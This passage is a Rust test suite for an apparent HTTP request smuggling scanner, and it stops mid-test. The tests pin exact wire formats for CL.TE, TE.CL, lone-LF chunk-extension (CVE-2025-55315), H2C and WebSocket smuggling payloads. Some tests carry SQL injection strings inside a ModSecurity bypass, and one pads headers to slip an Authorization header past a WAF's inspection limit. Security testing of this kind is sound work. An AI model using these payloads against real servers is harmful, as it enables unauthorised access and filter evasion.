#[cfg(test)]
#[allow(clippy::module_inception)]
mod tests {
    use crate::safety::{CircuitBreaker, ScanPolicy, guard_prefix_len, sanitize_input};
    use crate::smuggling::*;
    use proptest::prelude::*;
    #[cfg(feature = "unsafe-probes")]
    use std::collections::HashSet;

    fn parse_request(raw: &[u8]) -> Result<(), httparse::Error> {
        let mut headers = [httparse::EMPTY_HEADER; 64];
        let mut req = httparse::Request::new(&mut headers);
        match req.parse(raw) {
            Ok(s) if s.is_complete() => Ok(()),
            Ok(_) => Err(httparse::Error::TooManyHeaders),
            Err(e) => Err(e),
        }
    }

    #[test]
    fn cl_te_contains_smuggled_prefix() {
        let payload = cl_te("example.com", "GET /admin HTTP/1.1\r\nHost: example.com").unwrap();
        let raw_str = String::from_utf8_lossy(&payload.raw_bytes);
        assert!(raw_str.contains("GET /admin"));
        assert!(raw_str.contains("Content-Length:"));
        assert!(raw_str.contains("Transfer-Encoding: chunked"));
        assert_eq!(payload.variant, SmugglingVariant::ClTe);
        assert!(!payload.canary.token.is_empty());
    }

    #[test]
    fn cl_te_custom_nonzero_cl() {
        let payload = cl_te_custom("example.com", "X", 5).unwrap();
        assert!(String::from_utf8_lossy(&payload.raw_bytes).contains("Content-Length: 5"));
    }

    #[test]
    fn te_cl_dynamic_cl() {
        for len in 1..=100usize {
            let prefix = "A".repeat(len);
            let payload = te_cl("example.com", &prefix).unwrap();
            let raw = String::from_utf8_lossy(&payload.raw_bytes);
            // The chunk line is "{len:x}\r\n"
            let chunk_line = format!("{:x}\r\n", prefix.len() + 2).len();
            assert!(
                raw.contains(&format!("Content-Length: {chunk_line}")),
                "failed for len={len}"
            );
        }
    }

    #[test]
    fn te_cl_contains_chunked_body() {
        let payload = te_cl("example.com", "GET /admin HTTP/1.1\r\nHost: example.com").unwrap();
        let raw_str = String::from_utf8_lossy(&payload.raw_bytes);
        assert!(raw_str.contains("Transfer-Encoding: chunked"));
        assert!(raw_str.contains("0\r\n\r\n"));
        assert_eq!(payload.variant, SmugglingVariant::TeCl);
    }

    #[test]
    fn cl_te_places_smuggled_request_after_zero_chunk() {
        let payload = cl_te("example.com", "GET /admin HTTP/1.1\r\nHost: internal").unwrap();
        let raw_str = String::from_utf8_lossy(&payload.raw_bytes);
        let split = raw_str.split_once("\r\n\r\n").expect("separator missing");
        assert!(split.1.starts_with("0\r\n\r\nGET /admin HTTP/1.1"));
        // F76: CL is now the FULL body length (5 for `0\r\n\r\n` +
        // prefix bytes), not the pre-fix CL=0 stub. The body for the
        // 'GET /admin HTTP/1.1\r\nHost: internal' prefix is
        // `0\r\n\r\n` (5) + prefix (35) + ensure_double_crlf padding
        // → CL is non-zero and matches the byte length of the body
        // that follows the blank header line.
        let body_start = split.1;
        let expected_cl = body_start.len();
        assert!(
            raw_str.contains(&format!("Content-Length: {expected_cl}\r\n")),
            "Content-Length must match body length ({expected_cl}); got: {raw_str}"
        );
        assert!(expected_cl > 0, "F76: CL must not be 0");
    }

    #[test]
    fn te_cl_uses_dynamic_content_length() {
        let payload = te_cl("example.com", "GET /admin HTTP/1.1\r\nHost: internal").unwrap();
        let raw_str = String::from_utf8_lossy(&payload.raw_bytes);
        let smuggled_len = "GET /admin HTTP/1.1\r\nHost: internal\r\n".len();
        let expected_cl = format!("{:x}\r\n", smuggled_len + 2).len();
        assert!(raw_str.contains(&format!("Content-Length: {expected_cl}")));
    }

    #[test]
    fn te_te_uses_obfuscation() {
        let obs = te_obfuscations();
        for i in 0..obs.len().min(10) {
            let payload = te_te("example.com", "SMUGGLED", i).unwrap();
            assert_eq!(payload.variant, SmugglingVariant::TeTe);
            let raw_str = String::from_utf8_lossy(&payload.raw_bytes);
            assert!(raw_str.contains("SMUGGLED"));
        }
    }

    #[test]
    fn te_obfuscations_covers_smuggler_matrix() {
        let obs = te_obfuscations();
        assert!(
            obs.len() >= 20,
            "expected 20+ obfuscations, got {}",
            obs.len()
        );
        assert!(obs.iter().any(|s| s.contains('\n')));
        assert!(obs.iter().any(|s| s.contains('\t')));
        assert!(obs.iter().any(|s| s.contains('\u{00a0}')));
        assert!(obs.iter().any(|s| s.contains('"')));
        assert!(
            obs.iter()
                .any(|s| s.eq_ignore_ascii_case("transfer-encoding: chunked"))
        );
    }

    #[test]
    fn all_detection_probes_safe() {
        let probes = all_detection_probes("example.com").unwrap();
        assert!(!probes.is_empty());
        for p in &probes {
            assert!(!p.canary.token.is_empty());
            assert!(matches!(
                p.variant,
                SmugglingVariant::DetectClTe | SmugglingVariant::DetectTeCl
            ));
        }
    }

    #[cfg(feature = "unsafe-probes")]
    #[test]
    fn all_payloads_generates_full_set() {
        let payloads = all_payloads("example.com", "GET /secret HTTP/1.1").unwrap();
        assert!(payloads.len() >= 20, "expected 20+, got {}", payloads.len());
        let variants: HashSet<_> = payloads.iter().map(|p| p.variant).collect();
        assert!(variants.contains(&SmugglingVariant::ClTe));
        assert!(variants.contains(&SmugglingVariant::TeCl));
        assert!(variants.contains(&SmugglingVariant::H2c));
    }

    #[cfg(feature = "unsafe-probes")]
    #[test]
    fn all_payloads_unique() {
        let payloads = all_payloads("example.com", "GET / HTTP/1.1").unwrap();
        let raw: Vec<_> = payloads.iter().map(|p| p.raw_bytes.clone()).collect();
        let mut set = HashSet::new();
        for (i, r) in raw.iter().enumerate() {
            if !set.insert(r.clone()) {
                panic!(
                    "duplicate payload at index {}: {:?}",
                    i,
                    String::from_utf8_lossy(r)
                );
            }
        }
    }

    #[test]
    fn dual_cl_generates_two_headers() {
        let p = dual_cl("example.com", "GET / HTTP/1.1", 6, 5).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        let c1 = s.matches("Content-Length: 6").count();
        let c2 = s.matches("Content-Length: 5").count();
        assert_eq!(c1, 1);
        assert_eq!(c2, 1);
    }

    #[test]
    fn multi_value_cl_has_comma() {
        let p = multi_value_cl("example.com", "GET / HTTP/1.1").unwrap();
        assert!(String::from_utf8_lossy(&p.raw_bytes).contains("Content-Length: 5, 6"));
    }

    #[test]
    fn chunk_extension_present() {
        let p = chunk_extension("example.com", "GET / HTTP/1.1").unwrap();
        assert!(String::from_utf8_lossy(&p.raw_bytes).contains("1;ext=foo"));
    }

    // R69 pass-21 — CVE-2025-55315 chunk-extension lone-LF tests.

    #[test]
    fn chunk_extension_lone_lf_payload_contains_lone_lf_after_extension() {
        // The smoking gun: a bare `\n` (0x0A) MUST appear after the
        // extension token and BEFORE the smuggled prefix. If a future
        // "tidy" pass normalises this to `\r\n`, the entire CVE-2025-55315
        // bypass mechanism evaporates because both parsers see the same
        // legal CRLF and the desync is gone.
        let p = chunk_extension_lone_lf(
            "example.com",
            "GET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        .unwrap();
        // Find `evilext=` then assert the next byte is exactly 0x0A
        // (bare LF) — not 0x0D 0x0A (CRLF).
        let pos = p
            .raw_bytes
            .windows(b"evilext=".len())
            .position(|w| w == b"evilext=")
            .expect("extension marker must appear in wire bytes");
        let next = p.raw_bytes[pos + b"evilext=".len()];
        assert_eq!(
            next, b'\n',
            "byte after `evilext=` MUST be lone LF (0x0A); CRLF would defeat the desync"
        );
        // And the byte before MUST NOT be CR — a `\r\n` would mean we
        // accidentally emitted a regular CRLF.
        assert_ne!(
            p.raw_bytes[pos + b"evilext=".len() - 1],
            b'\r',
            "no CR before the lone-LF — must be a bare LF, not CRLF"
        );
    }

    #[test]
    fn chunk_extension_lone_lf_smuggled_prefix_reaches_wire() {
        // Operator-visible contract: the smuggled prefix MUST appear
        // verbatim in the wire bytes. If it didn't, the bypass would
        // generate a benign chunked request and never exercise the
        // CVE.
        let p = chunk_extension_lone_lf(
            "example.com",
            "GET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n",
        )
        .unwrap();
        let wire = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            wire.contains("/admin"),
            "smuggled prefix must reach the wire — pre-fix a re-encoding pass dropped it"
        );
    }

    #[test]
    fn chunk_extension_lone_lf_variant_tag_matches() {
        // Anti-rig: the SmugglingVariant tag MUST be `ChunkExtensionLoneLf`,
        // not `ChunkExtension`. The bandit and gene-bank dedup by variant
        // tag, so a wrong tag would silently merge CVE-2025-55315 successes
        // into the legacy chunk-extension pool.
        let p = chunk_extension_lone_lf("example.com", "GET / HTTP/1.1\r\nHost: x\r\n\r\n").unwrap();
        assert_eq!(p.variant, SmugglingVariant::ChunkExtensionLoneLf);
    }

    #[test]
    fn chunk_extension_lone_lf_terminates_chunked_body_cleanly() {
        // Anti-rig: the outer chunked encoding MUST end with `0\r\n\r\n`
        // — the standard zero-length terminator. Without it, the back-end
        // hangs waiting for more chunks and the smuggling test times out
        // rather than completing the desync.
        let p = chunk_extension_lone_lf("example.com", "GET / HTTP/1.1\r\nHost: x\r\n\r\n").unwrap();
        assert!(
            p.raw_bytes.ends_with(b"0\r\n\r\n"),
            "outer chunked body must terminate with 0\\r\\n\\r\\n; got tail: {:?}",
            &p.raw_bytes[p.raw_bytes.len().saturating_sub(16)..]
        );
    }

    #[test]
    fn chunk_extension_lone_lf_canary_is_unique_per_call() {
        // Anti-rig: every call produces a distinct canary so dogfood
        // log collation can correlate per-probe (per CLAUDE.md §13).
        // A static canary would conflate probes across runs.
        let a = chunk_extension_lone_lf("a.example", "GET / HTTP/1.1\r\nHost: a\r\n\r\n").unwrap();
        let b = chunk_extension_lone_lf("a.example", "GET / HTTP/1.1\r\nHost: a\r\n\r\n").unwrap();
        assert_ne!(a.canary.token, b.canary.token);
    }

    #[test]
    fn method_body_smuggle_variants() {
        for method in ["GET", "PUT", "DELETE", "PATCH", "OPTIONS"] {
            let p = method_body_smuggle(method, "example.com", "GET /admin HTTP/1.1").unwrap();
            assert!(String::from_utf8_lossy(&p.raw_bytes).starts_with(method));
        }
    }

    #[test]
    fn http10_persistence_has_keep_alive() {
        let ps = http10_persistence("example.com", "GET / HTTP/1.1").unwrap();
        let s0 = String::from_utf8_lossy(&ps[0].raw_bytes);
        assert!(s0.contains("HTTP/1.0"));
        assert!(
            s0.contains("Connection: keep-alive") || s0.contains("Proxy-Connection: keep-alive")
        );
    }

    #[test]
    fn http09_downgrade_no_version() {
        let p = http09_downgrade("example.com", "GET /admin HTTP/1.1").unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(s.starts_with("GET /"));
        // First line is HTTP/0.9 simple request, no version
        let first_line = s.lines().next().unwrap();
        assert!(!first_line.contains("HTTP/1.1"));
    }

    #[test]
    fn pipeline_builder_returns_pair() {
        let poison = cl_te("example.com", "GET /admin HTTP/1.1").unwrap();
        let (p, v) = pipeline_builder(&poison, "GET", "/victim", "example.com").unwrap();
        assert!(!p.is_empty());
        assert!(String::from_utf8_lossy(&v).contains("GET /victim HTTP/1.1"));
    }

    #[test]
    fn h2c_upgrade_only_no_settings() {
        let p = h2c_upgrade_only_smuggle("example.com").unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(!s.contains("HTTP2-Settings"));
        assert!(s.contains("Upgrade: h2c"));
    }

    #[test]
    fn malformed_http2_settings_variants() {
        let ps = malformed_http2_settings("example.com").unwrap();
        assert_eq!(ps.len(), 3);
    }

    #[test]
    fn websocket_smuggle_random_key() {
        let p1 = websocket_smuggle("example.com", "/chat").unwrap();
        let p2 = websocket_smuggle("example.com", "/chat").unwrap();
        let s1 = String::from_utf8_lossy(&p1.raw_bytes);
        let s2 = String::from_utf8_lossy(&p2.raw_bytes);
        assert!(s1.contains("Sec-WebSocket-Key:"));
        assert_ne!(s1, s2, "keys should be random per call");
    }

    #[test]
    fn cl_obfuscation_variants() {
        let ps = cl_obfuscation("example.com", "GET / HTTP/1.1").unwrap();
        assert_eq!(ps.len(), 4);
    }

    #[test]
    fn chunk_size_mutations_variants() {
        let ps = chunk_size_mutations("example.com", "GET / HTTP/1.1").unwrap();
        assert_eq!(ps.len(), 4);
    }

    #[test]
    fn cl_te_precedence_test_valid_chunked() {
        let ps = cl_te_precedence_test("example.com").unwrap();
        assert!(!ps.is_empty());
        let s = String::from_utf8_lossy(&ps[0].raw_bytes);
        assert!(s.contains("Transfer-Encoding: chunked"));
        assert!(s.contains("Content-Length:"));
    }

    #[test]
    fn canary_unique_per_payload() {
        let p1 = cl_te("example.com", "X").unwrap();
        let p2 = cl_te("example.com", "X").unwrap();
        assert_ne!(p1.canary.token, p2.canary.token);
    }

    #[test]
    fn raw_bytes_end_with_double_crlf() {
        // Note: detect_cl_te is intentionally excluded — its
        // canonical Portswigger shape ends with the smuggled `X`
        // byte (the prefix the TE-following backend treats as the
        // start of the next request), NOT `\r\n\r\n`. The
        // `\r\n\r\n` invariant holds for proper request-section
        // terminators, which the detection probes specifically
        // do NOT have in the same way.
        let payloads = vec![
            cl_te("example.com", "GET / HTTP/1.1").unwrap(),
            te_cl("example.com", "GET / HTTP/1.1").unwrap(),
            cl_zero("example.com", "GET / HTTP/1.1").unwrap(),
            detect_te_cl("example.com").unwrap(),
        ];
        for p in &payloads {
            assert!(
                p.raw_bytes.ends_with(b"\r\n\r\n"),
                "{:?} missing double CRLF",
                p.variant
            );
        }
    }

    #[test]
    fn detect_cl_te_uses_canonical_portswigger_shape() {
        // CL=6 must cover EXACTLY the 6-byte body `0\r\n\r\nX`.
        // Anything longer or shorter changes which side hangs and
        // breaks the timing oracle. Pin the exact wire shape so a
        // refactor can't silently regress the probe.
        let p = detect_cl_te("example.com").unwrap();
        let raw = &p.raw_bytes;
        assert!(
            raw.windows("Content-Length: 6\r\n".len())
                .any(|w| w == b"Content-Length: 6\r\n"),
            "CL must be 6"
        );
        // The body is the last 6 bytes of the message — split on
        // the FIRST \r\n\r\n (headers/body terminator) by finding
        // its position, then everything after is the 6-byte body.
        let header_end = raw
            .windows(4)
            .position(|w| w == b"\r\n\r\n")
            .expect("header terminator");
        let body = &raw[header_end + 4..];
        assert_eq!(
            body, b"0\r\n\r\nX",
            "body must be canonical CL.TE 6-byte form"
        );
    }

    #[test]
    fn sanitize_blocks_crlf() {
        assert!(sanitize_input("foo\r\nbar").is_err());
        assert!(sanitize_input("foo\nbar").is_err());
        assert!(sanitize_input("foo\rbar").is_err());
        assert!(sanitize_input("foobar").is_ok());
    }

    #[test]
    fn guard_prefix_len_blocks_huge() {
        let huge = "A".repeat(100_000);
        assert!(guard_prefix_len(&huge, 64 * 1024).is_err());
        assert!(guard_prefix_len(&"A".repeat(100), 64 * 1024).is_ok());
    }

    #[test]
    fn scan_policy_backoff_grows() {
        let policy = ScanPolicy::default();
        let d0 = policy.backoff_delay(0);
        let d1 = policy.backoff_delay(1);
        let d2 = policy.backoff_delay(2);
        assert!(d1 >= d0);
        assert!(d2 >= d1);
    }

    #[test]
    fn circuit_breaker_opens_then_recovers() {
        let mut cb = CircuitBreaker::new(2, 10);
        assert!(cb.can_proceed());
        cb.record_failure();
        cb.record_failure();
        assert!(!cb.can_proceed());
        std::thread::sleep(std::time::Duration::from_millis(15));
        assert!(cb.can_proceed());
    }

    #[test]
    fn cache_buster_unique_and_numeric() {
        // Audit (2026-05-10): pre-fix this only checked non-empty.
        // A bug returning a constant `"x"` would have passed.
        // Now: uniqueness across N calls + valid base-10 integer.
        use std::collections::HashSet;
        let mut seen = HashSet::new();
        for _ in 0..100 {
            let b = crate::safety::cache_buster();
            assert!(!b.is_empty(), "cache_buster must not return empty");
            assert!(
                b.parse::<u64>().is_ok(),
                "cache_buster must produce a base-10 integer, got: {b:?}"
            );
            assert!(seen.insert(b), "cache_buster collided across 100 calls");
        }
    }

    #[test]
    fn httparse_validates_all_payloads() {
        let payloads = vec![
            cl_te("example.com", "GET / HTTP/1.1\r\nHost: example.com\r\n").unwrap(),
            te_cl("example.com", "GET / HTTP/1.1\r\nHost: example.com\r\n").unwrap(),
            cl_zero("example.com", "GET / HTTP/1.1\r\nHost: example.com\r\n").unwrap(),
            detect_cl_te("example.com").unwrap(),
            detect_te_cl("example.com").unwrap(),
        ];
        for p in &payloads {
            parse_request(&p.raw_bytes).expect("httparse rejected payload");
        }
    }

    #[test]
    fn adversarial_random_delays_and_rst() {
        // The parser must classify correctly regardless of upstream behavior.
        // We simulate by verifying payload structure is deterministic.
        let p = detect_cl_te("example.com").unwrap();
        let s1 = String::from_utf8_lossy(&p.raw_bytes);
        let p2 = detect_cl_te("example.com").unwrap();
        let s2 = String::from_utf8_lossy(&p2.raw_bytes);
        assert_eq!(
            s1.replace(&p.canary.token, ""),
            s2.replace(&p2.canary.token, "")
        );
    }

    proptest! {
        #[test]
        fn prop_cl_te_idempotent(host in "[a-z0-9]{1,20}", prefix in "[A-Z/]{1,50}") {
            let p1 = cl_te(&host, &prefix).unwrap();
            let p2 = cl_te(&host, &prefix).unwrap();
            // Everything except canary must match
            assert_eq!(p1.variant, p2.variant);
            assert_eq!(p1.description, p2.description);
            assert_eq!(p1.raw_bytes.len(), p2.raw_bytes.len());
        }

        #[test]
        fn prop_te_cl_structure(host in "[a-z0-9]{1,20}", prefix in "[A-Z/]{1,50}") {
            let p = te_cl(&host, &prefix).unwrap();
            let s = String::from_utf8_lossy(&p.raw_bytes);
            assert!(s.contains("Transfer-Encoding: chunked"));
            assert!(s.contains("Content-Length:"));
        }

        #[test]
        fn prop_chunked_parser_bounded(data in prop::collection::vec(any::<u8>(), 0..1024)) {
            use crate::parser::ChunkedParser;
            let parser = ChunkedParser::default();
            // Must not panic on arbitrary bytes
            let _ = parser.parse(&data);
        }
    }

    #[test]
    fn concurrency_stress_payloads_remain_well_formed() {
        // Audit (2026-05-10): pre-fix this only checked that the
        // threads didn't panic. A bug returning empty bytes would
        // have passed. Now we verify each payload contains the Host
        // header and ends with the expected request terminator.
        use std::thread;
        let handles: Vec<_> = (0..16)
            .map(|_| {
                thread::spawn(|| {
                    for _ in 0..100 {
                        let p = cl_te("example.com", "GET / HTTP/1.1").unwrap();
                        let s = String::from_utf8_lossy(&p.raw_bytes);
                        assert!(s.contains("Host: example.com"));
                        assert!(s.contains("\r\n\r\n"), "payload missing header terminator");
                        assert!(!p.canary.token.is_empty(), "canary must be non-empty");

                        let p = te_cl("example.com", "GET / HTTP/1.1").unwrap();
                        let s = String::from_utf8_lossy(&p.raw_bytes);
                        assert!(s.contains("Transfer-Encoding: chunked"));

                        let obfs = te_obfuscations();
                        assert!(!obfs.is_empty(), "te_obfuscations must yield variants");
                    }
                })
            })
            .collect();
        for h in handles {
            h.join().unwrap();
        }
    }

    #[test]
    fn multibyte_utf8_path_round_trips_in_payload() {
        // Audit (2026-05-10): pre-fix this only asserted non-empty.
        // A bug ASCII-stripping the path would have passed silently.
        // Now we assert the actual Japanese characters survive into
        // the wire bytes.
        let path = "/admin/日本語";
        let p = te_cl("example.com", path).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains(path),
            "multibyte path must round-trip into the payload"
        );
        // Sanity: the request line carries the path.
        assert!(
            s.contains(&format!("GET {path}")) || s.contains(path),
            "multibyte path must appear in payload bytes: {s:?}"
        );
    }

    #[test]
    fn websocket_custom_key_rejects_crlf() {
        assert!(websocket_smuggle_custom("example.com", "/ws", Some("bad\r\nkey"), None).is_err());
        assert!(websocket_smuggle_custom("example.com", "/ws", Some("bad\nkey"), None).is_err());
        assert!(
            websocket_smuggle_custom("example.com", "/ws", None, Some("bad\r\nproto")).is_err()
        );
        // Safe values should succeed
        assert!(
            websocket_smuggle_custom("example.com", "/ws", Some("safe-key"), Some("safe-proto"))
                .is_ok()
        );
    }

    // ── New tests added 2026-05-24 ─────────────────────────────────────────

    #[test]
    fn sanitize_blocks_null_byte() {
        // NULL byte should be rejected by sanitize_input — it causes many
        // HTTP/1 stacks to truncate header values, enabling header injection.
        assert!(sanitize_input("host\x00injected.com").is_err());
        assert!(sanitize_input("safe-host.com").is_ok());
    }

    #[test]
    fn cl_te_host_appears_exactly_once() {
        let p = cl_te("example.com", "GET /admin HTTP/1.1").unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        let count = s.matches("Host: example.com").count();
        assert_eq!(count, 1, "Host header must appear exactly once");
    }

    #[test]
    fn te_cl_host_appears_exactly_once() {
        let p = te_cl("example.com", "GET /admin HTTP/1.1").unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        let count = s.matches("Host: example.com").count();
        assert_eq!(count, 1, "Host header must appear exactly once in TE.CL");
    }

    #[test]
    fn cl_te_smuggled_prefix_in_raw_bytes() {
        let prefix = "GET /internal HTTP/1.1";
        let p = cl_te("example.com", prefix).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains(prefix),
            "smuggled prefix must appear verbatim in raw_bytes"
        );
    }

    #[test]
    fn te_cl_smuggled_prefix_in_raw_bytes() {
        let prefix = "GET /secret HTTP/1.1";
        let p = te_cl("example.com", prefix).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains(prefix),
            "TE.CL smuggled prefix must appear verbatim in raw_bytes"
        );
    }

    #[test]
    fn guard_prefix_len_at_exact_limit_succeeds() {
        // Exactly at the limit (64 KiB) should succeed.
        let exactly_limit = "A".repeat(64 * 1024);
        assert!(guard_prefix_len(&exactly_limit, 64 * 1024).is_ok());
    }

    #[test]
    fn guard_prefix_len_one_over_limit_fails() {
        // One byte over the limit must fail.
        let over_limit = "A".repeat(64 * 1024 + 1);
        assert!(guard_prefix_len(&over_limit, 64 * 1024).is_err());
    }

    #[test]
    fn detect_cl_te_body_exactly_6_bytes() {
        let p = detect_cl_te("example.com").unwrap();
        // Find the header/body separator.
        let sep = b"\r\n\r\n";
        let pos = p
            .raw_bytes
            .windows(sep.len())
            .position(|w| w == sep)
            .expect("header separator must be present");
        let body = &p.raw_bytes[pos + sep.len()..];
        assert_eq!(
            body.len(),
            6,
            "detect_cl_te body must be exactly 6 bytes (0\\r\\n\\r\\nX), got {}",
            body.len()
        );
    }

    #[test]
    fn detect_te_cl_content_length_is_3() {
        // CL=3 covers exactly the first chunk-size line "5\r\n" (3 bytes).
        let p = detect_te_cl("example.com").unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains("Content-Length: 3\r\n"),
            "detect_te_cl CL must be 3 (covers only the chunk-size line), got:\n{s}"
        );
    }

    #[test]
    fn h2c_smuggle_contains_upgrade_header() {
        let p = h2c_smuggle("example.com", None).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(s.contains("Upgrade: h2c"));
        assert!(s.contains("HTTP2-Settings:"));
    }

    #[test]
    fn h2c_post_smuggle_body_appended() {
        let body = b"payload=test";
        let p = h2c_post_smuggle("example.com", body, None).unwrap();
        assert!(
            p.raw_bytes.ends_with(body),
            "H2C POST body must be appended at the end of raw_bytes"
        );
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(s.contains(&format!("Content-Length: {}", body.len())));
    }

    #[test]
    fn cl_te_custom_content_length_overrides() {
        // A caller-specified CL=99 must appear verbatim.
        let p = cl_te_custom("example.com", "SMUGGLED", 99).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(s.contains("Content-Length: 99"));
    }

    // ── Wire-format tests for functions lacking paired CVE-shape checks ────

    /// CVE-2024-1019 (ModSec URI pre-decode split) — exact wire format.
    ///
    /// The produced path must have the exact structure:
    ///   `<base>%3F<injection>?<benign>`
    ///
    /// ModSecurity URL-decodes before split-on-`?`, so `%3F` becomes `?` for
    /// ModSec (making it think the query starts there), while nginx/Apache
    /// split on the literal `?`, routing the injection as part of the PATH.
    #[test]
    fn modsec_uri_pre_decode_split_wire_format() {
        let path = modsec_uri_pre_decode_split("/search", "' OR 1=1--", "q=x");
        // Must contain the URL-encoded question mark delimiter.
        assert!(
            path.contains("%3F"),
            "path must contain %3F (the ModSec-decoded ? pivot), got: {path}"
        );
        // Must contain the real ? separating backend query.
        let real_q_pos = path
            .rfind('?')
            .expect("path must contain a real ? for backend query boundary");
        // Injection must be between %3F and the real ?.
        let encoded_pos = path.find("%3F").expect("%3F must be present");
        assert!(
            encoded_pos < real_q_pos,
            "%3F (pos {encoded_pos}) must come before literal ? (pos {real_q_pos})"
        );
        // Injection payload must be present.
        assert!(
            path.contains("' OR 1=1--"),
            "injection payload must appear in path, got: {path}"
        );
        // Benign query must be after the real ?.
        let after_q = &path[real_q_pos + 1..];
        assert!(
            after_q.contains("q=x"),
            "benign query must follow the real ?, got after-?: {after_q}"
        );
        // Structure: base%3Finjection?benign
        assert!(
            path.starts_with("/search%3F"),
            "must start with base_path + %3F, got: {path}"
        );
    }

    /// `modsec_uri_pre_decode_split` with a SQL payload.
    #[test]
    fn modsec_uri_pre_decode_split_sql_payload() {
        let path = modsec_uri_pre_decode_split("/api/v1/users", "UNION SELECT 1,2,3--", "page=1");
        assert!(path.contains("%3F"));
        assert!(path.contains("UNION SELECT 1,2,3--"));
        assert!(path.contains("?page=1"));
        assert_eq!(
            path,
            "/api/v1/users%3FUNION SELECT 1,2,3--?page=1",
            "wire format must match exactly"
        );
    }

    /// `header_overflow_smuggle` — wire format: N padding headers + payload.
    ///
    /// OpenResty / CF FL silently drops headers past the WAF parsing limit
    /// (≈94 headers). Padding must use the `X-Pad-{i}` name pattern;
    /// the payload must be the LAST header in the list.
    #[test]
    fn header_overflow_smuggle_padding_count_and_payload_position() {
        let headers = header_overflow_smuggle(5, "X-Evil-Header", "injection-value");
        // Total headers = 5 padding + 1 payload.
        assert_eq!(
            headers.len(),
            6,
            "must produce padding_count + 1 headers (5 padding + 1 payload = 6)"
        );
        // Padding headers use X-Pad-{i} name.
        for (i, (name, val)) in headers.iter().enumerate().take(5) {
            assert_eq!(
                name,
                &format!("X-Pad-{i}"),
                "padding header {i} must be X-Pad-{i}, got: {name}"
            );
            assert_eq!(val, "v", "padding value must be 'v', got: {val}");
        }
        // Payload is the final element.
        let (payload_name, payload_val) = &headers[5];
        assert_eq!(
            payload_name, "X-Evil-Header",
            "payload header name must be last, got: {payload_name}"
        );
        assert_eq!(
            payload_val, "injection-value",
            "payload header value must be exact, got: {payload_val}"
        );
    }

    /// `header_overflow_smuggle` with zero padding: only the payload header.
    #[test]
    fn header_overflow_smuggle_zero_padding() {
        let headers = header_overflow_smuggle(0, "X-Payload", "value");
        assert_eq!(headers.len(), 1, "zero padding must produce exactly 1 header");
        assert_eq!(headers[0].0, "X-Payload");
        assert_eq!(headers[0].1, "value");
    }

    /// `header_overflow_smuggle` at a realistic WAF threshold (94 padding).
    #[test]
    fn header_overflow_smuggle_at_waf_threshold() {
        // 94 padding + 1 payload = 95 total. The payload is the 95th header,
        // which falls past OpenResty's ~94-header inspection limit.
        let headers = header_overflow_smuggle(94, "Authorization", "Bearer smuggled");
        assert_eq!(headers.len(), 95, "must have 95 headers total (94 padding + 1 payload)");
        // All padding headers must be X-Pad-0 through X-Pad-93.
        for (i, header) in headers.iter().enumerate().take(94) {
            assert_eq!(header.0, format!("X-Pad-{i}"));
        }
        // Payload is the 95th.
        assert_eq!(headers[94].0, "Authorization");
        assert_eq!(headers[94].1, "Bearer smuggled");
    }

    /// `websocket_smuggle_custom` with custom key and protocol — wire format.
    ///
    /// The produced payload must include the exact custom key in
    /// `Sec-WebSocket-Key:` and the protocol in `Sec-WebSocket-Protocol:`.
    #[test]
    fn websocket_smuggle_custom_key_in_payload() {
        let key = "dGhlIHNhbXBsZSBub25jZQ=="; // base64("the sample nonce")
        let p = websocket_smuggle_custom("example.com", "/ws", Some(key), None).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains(&format!("Sec-WebSocket-Key: {key}\r\n")),
            "custom key must appear verbatim in Sec-WebSocket-Key header, got:\n{s}"
        );
        // Must not contain Sec-WebSocket-Protocol when protocol is None.
        assert!(
            !s.contains("Sec-WebSocket-Protocol:"),
            "must not include Sec-WebSocket-Protocol when protocol is None, got:\n{s}"
        );
        assert_eq!(p.variant, SmugglingVariant::WebSocket);
    }

    /// `websocket_smuggle_custom` with both key and protocol.
    #[test]
    fn websocket_smuggle_custom_with_protocol() {
        let key = "testkey==";
        let proto = "chat, superchat";
        let p =
            websocket_smuggle_custom("example.com", "/chat", Some(key), Some(proto)).unwrap();
        let s = String::from_utf8_lossy(&p.raw_bytes);
        assert!(
            s.contains(&format!("Sec-WebSocket-Key: {key}\r\n")),
            "custom key must appear verbatim"
        );
        assert!(
            s.contains(&format!("Sec-WebSocket-Protocol: {proto}\r\n")),
            "protocol must appear in Sec-WebSocket-Protocol header, got:\n{s}"
        );
        assert!(s.contains("GET /chat HTTP/1.1\r\n"));
    }

    /// `cl_te_precedence_test` — wire format matches RFC-legal CL+TE body.
    ///
    /// This probe sends both CL and TE. The body `5\r\nhello\r\n0\r\n\r\n`
    /// is valid chunked encoding (5-byte chunk "hello", then terminator).
    /// CL equals the full body byte count. This is the "both headers
    /// present, consistent" case used to distinguish frontend/backend
    /// parsing behaviour without causing a hang.
    #[test]
    fn cl_te_precedence_test_wire_format() {
        let payloads = cl_te_precedence_test("example.com").unwrap();
        assert!(!payloads.is_empty(), "must return at least one payload");
        let p = &payloads[0];
        let s = String::from_utf8_lossy(&p.raw_bytes);
        // Must have both headers.
        assert!(
            s.contains("Content-Length:"),
            "must include Content-Length header"
        );
        assert!(
            s.contains("Transfer-Encoding: chunked"),
            "must include Transfer-Encoding: chunked"
        );
        // CL must match the byte length of the chunked body.
        let body_content = "5\r\nhello\r\n0\r\n\r\n";
        let expected_cl = body_content.len();
        assert!(
            s.contains(&format!("Content-Length: {expected_cl}\r\n")),
            "CL ({expected_cl}) must equal body byte count, got:\n{s}"
        );
        // Body must be the chunked encoding of "hello".
        let sep_pos = p
            .raw_bytes
            .windows(4)
            .position(|w| w == b"\r\n\r\n")
            .expect("header separator");
